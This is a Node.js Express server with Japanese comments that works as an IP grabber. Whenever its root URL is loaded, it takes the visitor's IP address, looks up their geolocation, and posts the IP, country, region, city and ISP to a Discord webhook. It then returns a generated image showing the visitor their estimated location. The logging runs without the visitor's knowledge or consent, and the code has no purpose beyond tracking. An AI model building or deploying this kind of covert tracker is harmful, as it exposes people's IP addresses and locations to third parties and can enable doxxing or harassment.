const express = require('express');
const { createCanvas, loadImage } = require('canvas');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Discord Webhook (Renderの環境変数から取得)
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// 背景画像のパス
const BACKGROUND_IMAGE_PATH = path.join(__dirname, 'background.jpg');

app.set('trust proxy', true);

app.get('/', async (req, res) => {
    // 1. IPアドレスを取得
    let rawIp = req.headers['x-forwarded-for'] || req.ip || '';
    let ip = rawIp.split(',')[0].trim();

    try {
        // 2. IP情報を取得
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const geoData = await geoResponse.json();

        // 3. Discordへのメッセージ組み立て
        let discordMessage = `🚨 **新しいアクセスを検知しました！**\nIPアドレス: \`${ip}\`\n`;
        let locationText = '';
        
        if (geoData.status === 'success') {
            discordMessage += `国: ${geoData.country}\n地域: ${geoData.regionName}\n都市: ${geoData.city}\nプロバイダ: ${geoData.isp}`;
            locationText = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
        } else {
            discordMessage += `位置情報の取得に失敗しました: ${geoData.message}`;
            locationText = '未知の場所';
        }

        // Discordへ送信 (エラーが起きても止まらないようにcatchをつける)
        if (DISCORD_WEBHOOK_URL) {
            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: discordMessage })
            }).catch(err => console.error('Discord送信エラー:', err));
        }

        // 4. 画像を生成 (1920x1080)
        const width = 1920;
        const height = 1080;
        const canvas = createCanvas(width, height);
        const ctx = canvas.getContext('2d');

        // 背景画像の読み込みと描画
        const background = await loadImage(BACKGROUND_IMAGE_PATH);
        const imgRatio = background.width / background.height;
        const canvasRatio = width / height;
        let dWidth, dHeight, dx, dy;

        if (imgRatio > canvasRatio) {
            dHeight = height;
            dWidth = background.width * (height / background.height);
            dx = (width - dWidth) / 2;
            dy = 0;
        } else {
            dWidth = width;
            dHeight = background.height * (width / background.width);
            dx = 0;
            dy = (height - dHeight) / 2;
        }
        ctx.drawImage(background, dx, dy, dWidth, dHeight);

        // テキストの描画設定
        ctx.fillStyle = '#ffffff'; // 白色
        ctx.textAlign = 'center'; // 中央揃え
        ctx.shadowColor = 'rgba(0, 0, 0, 0.7)'; // 影
        ctx.shadowBlur = 10;
        ctx.shadowOffsetX = 5;
        ctx.shadowOffsetY = 5;

        // タイトル
        ctx.font = 'bold 80px sans-serif';
        ctx.fillText('あなたの推定位置 (大まか)', width / 2, height / 2 - 100);

        // 都市名
        ctx.font = 'bold 120px sans-serif';
        ctx.fillText(locationText, width / 2, height / 2 + 50);

        // IPアドレス
        ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
        ctx.font = '40px sans-serif';
        ctx.shadowBlur = 0;
        ctx.fillText(`IP: ${ip}`, width / 2, height - 100);

        // 5. 画像をレスポンスとして返す
        const buffer = canvas.toBuffer('image/png');
        res.set('Content-Type', 'image/png');
        res.send(buffer);

    } catch (error) {
        console.error('❌ エラーが発生しました:', error.message);
        res.status(500).send('サーバーエラー');
    }
});

app.listen(PORT, () => {
    console.log(`サーバーが起動しました: http://localhost:${PORT}`);
});
